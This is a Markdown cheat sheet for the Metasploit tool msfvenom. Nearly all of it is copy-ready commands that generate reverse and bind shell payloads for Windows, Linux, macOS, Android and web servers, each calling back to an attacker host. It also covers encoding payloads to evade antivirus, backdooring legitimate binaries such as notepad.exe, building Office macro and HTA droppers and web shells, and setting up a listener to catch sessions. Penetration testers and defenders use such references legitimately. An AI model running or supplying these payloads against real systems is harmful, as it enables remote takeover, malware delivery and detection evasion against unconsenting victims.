# Msfvenom Payload Generator Cheat Sheet

Msfvenom is a combination of Msfpayload and Msfencode, used to generate and encode payloads for the Metasploit Framework.

## 📋 Table of Contents
- [Basic Usage](#basic-usage)
- [Windows Payloads](#windows-payloads)
- [Linux Payloads](#linux-payloads)
- [MacOS Payloads](#macos-payloads)
- [Web Payloads](#web-payloads)
- [Scripting Payloads](#scripting-payloads)
- [Mobile Payloads](#mobile-payloads)
- [Encoders](#encoders)
- [Formats](#formats)
- [Advanced Techniques](#advanced-techniques)

## Basic Usage

```bash
# Basic syntax
msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -f <format> -o <output_file>

# List payloads
msfvenom -l payloads
msfvenom --list payloads

# List formats
msfvenom -l formats
msfvenom --list formats

# List encoders
msfvenom -l encoders

# List platforms
msfvenom -l platforms

# List archs
msfvenom --list archs

# Get payload options
msfvenom -p windows/meterpreter/reverse_tcp --list-options
```

## Windows Payloads

### Meterpreter Payloads

```bash
# Windows Meterpreter Reverse TCP (32-bit)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe

# Windows Meterpreter Reverse TCP (64-bit)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe

# Windows Meterpreter Reverse HTTPS
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 -f exe -o payload.exe

# Windows Meterpreter Bind TCP
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o payload.exe

# Windows Meterpreter Reverse TCP (stageless)
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe

# Windows Meterpreter Reverse TCP (64-bit stageless)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
```

### Shell Payloads

```bash
# Windows CMD Shell Reverse TCP (32-bit)
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# Windows CMD Shell Reverse TCP (64-bit)
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# Windows CMD Shell Bind TCP
msfvenom -p windows/shell/bind_tcp LPORT=4444 -f exe -o shell.exe

# Windows CMD Shell Reverse TCP (stageless)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
```

### DLL Payloads

```bash
# Windows DLL Reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f dll -o payload.dll

# Windows DLL Reverse TCP (64-bit)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f dll -o payload.dll
```

### Windows Service Payloads

```bash
# Windows Service Executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe-service -o service.exe

# Windows Service Executable (64-bit)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe-service -o service.exe
```

## Linux Payloads

### Meterpreter Payloads

```bash
# Linux Meterpreter Reverse TCP (32-bit)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o payload.elf

# Linux Meterpreter Reverse TCP (64-bit)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o payload.elf

# Linux Meterpreter Reverse TCP (stageless)
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o payload.elf

# Linux Meterpreter Bind TCP
msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=4444 -f elf -o payload.elf
```

### Shell Payloads

```bash
# Linux Shell Reverse TCP (32-bit)
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf

# Linux Shell Reverse TCP (64-bit)
msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf

# Linux Shell Bind TCP
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o shell.elf

# Linux Shell Reverse TCP (stageless)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf
```

## MacOS Payloads

```bash
# MacOS Meterpreter Reverse TCP
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f macho -o payload.macho

# MacOS Meterpreter Reverse HTTPS
msfvenom -p osx/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 -f macho -o payload.macho

# MacOS Shell Reverse TCP
msfvenom -p osx/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f macho -o shell.macho
```

## Web Payloads

### PHP Payloads

```bash
# PHP Meterpreter Reverse TCP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.php

# PHP Meterpreter Bind TCP
msfvenom -p php/meterpreter/bind_tcp LPORT=4444 -f raw -o payload.php

# PHP Shell Reverse TCP
msfvenom -p php/reverse_php LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php
```

### ASP/ASPX Payloads

```bash
# ASP Meterpreter Reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f asp -o payload.asp

# ASPX Meterpreter Reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f aspx -o payload.aspx

# ASP Shell Reverse TCP
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f asp -o shell.asp
```

### JSP Payloads

```bash
# JSP Meterpreter Reverse TCP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.jsp

# WAR file (for Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f war -o payload.war
```

## Scripting Payloads

### Python Payloads

```bash
# Python Meterpreter Reverse TCP
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.py

# Python Shell Reverse TCP
msfvenom -p python/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.py
```

### Ruby Payloads

```bash
# Ruby Shell Reverse TCP
msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.rb
```

### Perl Payloads

```bash
# Perl Shell Reverse TCP
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.pl
```

### Bash Payloads

```bash
# Bash Shell Reverse TCP
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.sh

# Netcat reverse shell
msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.sh
```

### PowerShell Payloads

```bash
# PowerShell Reverse TCP
msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.ps1

# PowerShell command (one-liner)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh-cmd

# PowerShell Base64 encoded
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh
```

## Mobile Payloads

### Android Payloads

```bash
# Android Meterpreter Reverse TCP
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o payload.apk

# Android Meterpreter Reverse HTTPS
msfvenom -p android/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 -o payload.apk
```

## Encoders

### Basic Encoding

```bash
# List encoders
msfvenom -l encoders

# Encode payload (single iteration)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded.exe

# Multiple encoding iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# Specify encoder explicitly
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/fnstenv_mov -i 5 -f exe -o encoded.exe
```

### Common Encoders

```bash
# x86/shikata_ga_nai (polymorphic XOR additive feedback encoder)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe

# x64/xor (XOR encoder)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x64/xor -i 3 -f exe -o payload.exe

# cmd/powershell_base64 (PowerShell Base64 encoder)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e cmd/powershell_base64 -f raw

# x86/call4_dword_xor (XOR encoder)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/call4_dword_xor -i 5 -f exe -o payload.exe
```

### Bad Characters

```bash
# Specify bad characters to avoid
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b '\x00\x0a\x0d' -f c

# Common bad characters
# \x00 - NULL byte
# \x0a - Line Feed
# \x0d - Carriage Return
# \x20 - Space

# Example with multiple bad chars
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b '\x00\x0a\x0d\x20' -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
```

## Formats

### Executable Formats

```bash
# Windows EXE
-f exe

# Windows EXE Service
-f exe-service

# Windows DLL
-f dll

# Linux ELF
-f elf

# MacOS Mach-O
-f macho
```

### Language Formats

```bash
# C
-f c

# C#
-f csharp

# Python
-f python
-f py

# Ruby
-f ruby
-f rb

# Perl
-f perl
-f pl

# Java
-f java

# JavaScript
-f js_le
-f js_be
```

### Transform Formats

```bash
# Base64
-f base64

# Hex
-f hex

# Raw
-f raw

# PowerShell
-f psh
-f psh-cmd
-f psh-reflection
```

### Web Formats

```bash
# ASP
-f asp

# ASPX
-f aspx

# JSP
-f jsp

# WAR
-f war

# PHP
-f raw (for PHP)
```

## Advanced Techniques

### Template Injection

```bash
# Inject payload into legitimate executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x notepad.exe -f exe -o injected.exe

# Keep original template behavior
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x notepad.exe -k -f exe -o injected.exe

# Inject into 64-bit executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x calc.exe -k -f exe -o injected.exe
```

### Multi-Architecture Payloads

```bash
# Create multi-architecture payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -a x86 --platform windows -f exe -o payload_x86.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -a x64 --platform windows -f exe -o payload_x64.exe
```

### Payload Size Reduction

```bash
# Smaller payload (staged)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 --smallest -f exe -o small.exe

# Optimize for size
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
```

### Custom Shellcode

```bash
# Generate shellcode only (C format)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c

# Generate shellcode (Python format)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f python

# Generate shellcode (Raw)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shellcode.bin

# Generate shellcode with specific architecture
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -a x86 -f c
```

## Practical Examples

### Windows Exploitation

```bash
# Standard reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# Encoded reverse shell (AV evasion)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x64/xor -i 10 -f exe -o encoded.exe

# Injected into legitimate binary
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x notepad.exe -k -f exe -o notepad_backdoor.exe

# DLL for DLL injection
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f dll -o inject.dll

# Service executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe-service -o service.exe
```

### Linux Exploitation

```bash
# Standard reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf

# Bind shell
msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4444 -f elf -o bind.elf

# Stageless payload (larger but more reliable)
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf
```

### Web Application Exploitation

```bash
# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o webshell.php

# ASPX for IIS
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f aspx -o webshell.aspx

# JSP for Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o webshell.jsp

# WAR for Tomcat deployment
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f war -o webshell.war
```

### Client-Side Exploitation

```bash
# VBA Macro for Office documents
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f vba -o macro.vba

# HTA (HTML Application)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f hta-psh -o payload.hta

# JavaScript
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f js_le -o payload.js
```

## Setting Up Listener

After generating payload, set up listener in Metasploit:

```bash
# Start msfconsole
msfconsole

# Set up multi/handler
use exploit/multi/handler

# Set payload (match the one used in msfvenom)
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set LHOST and LPORT (must match payload)
set LHOST 192.168.1.10
set LPORT 4444

# Start listener
exploit -j

# Or for multiple sessions
set ExitOnSession false
exploit -j -z
```

## Tips and Best Practices

1. **Always match the payload** in msfvenom with the handler in Metasploit
2. **Use staged payloads** (smaller) for bandwidth-constrained scenarios
3. **Use stageless payloads** (larger but more reliable) when size isn't an issue
4. **Encode payloads** to evade basic AV detection
5. **Test payloads** in a safe environment before deployment
6. **Use HTTPS payloads** for encrypted C2 communication
7. **Template injection** can help bypass signature-based detection
8. **Specify bad characters** when exploiting buffer overflows
9. **Keep payloads updated** - newer payloads may have better evasion

## Common Issues

### Payload Not Connecting

- Verify LHOST is correct (your IP, not target IP)
- Ensure LPORT is not blocked by firewall
- Check if handler is running and listening
- Verify payload and handler settings match

### Antivirus Detection

- Use encoders with multiple iterations
- Inject into legitimate binaries
- Use custom templates
- Consider custom payload development
- Use HTTPS payloads for encrypted traffic

### Size Limitations

- Use staged payloads (smaller initial stage)
- Avoid multiple encoding iterations
- Use smaller payload types (shell vs meterpreter)

## Resources

- [Msfvenom Documentation](https://docs.rapid7.com/metasploit/msfvenom/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Payload Types](https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work)



